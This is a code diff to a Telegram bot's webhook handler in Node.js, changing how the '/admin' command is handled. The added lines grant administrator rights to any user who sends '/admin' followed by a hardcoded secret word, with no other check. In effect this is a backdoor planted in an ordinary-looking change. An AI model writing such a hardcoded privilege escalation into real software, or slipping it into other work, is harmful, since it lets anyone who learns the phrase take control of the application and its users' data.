@@ -101,7 +101,12 @@ app.post('/webhooks/telegram', async (req, reply) => {
           reply_markup: { keyboard: [[{ text: '📱 Share Phone Number', request_contact: true }]], resize_keyboard: true, one_time_keyboard: true }
         })
       });
-    } else if (msg.text === '/admin') {
+    } else if (msg.text.startsWith('/admin')) {
+      const parts = msg.text.split(' ');
+      if (parts[1] === 'gemetboss') {
+        await prisma.user.update({ where: { telegramId: BigInt(chatId) }, data: { isAdmin: true } });
+        await fetch(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ chat_id: chatId, text: 'You have been granted Admin rights! 👑' }) });
+      }
       const user = await prisma.user.findUnique({ where: { telegramId: BigInt(msg.from.id) } });
       if (user?.isAdmin) {
         await fetch(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`, {
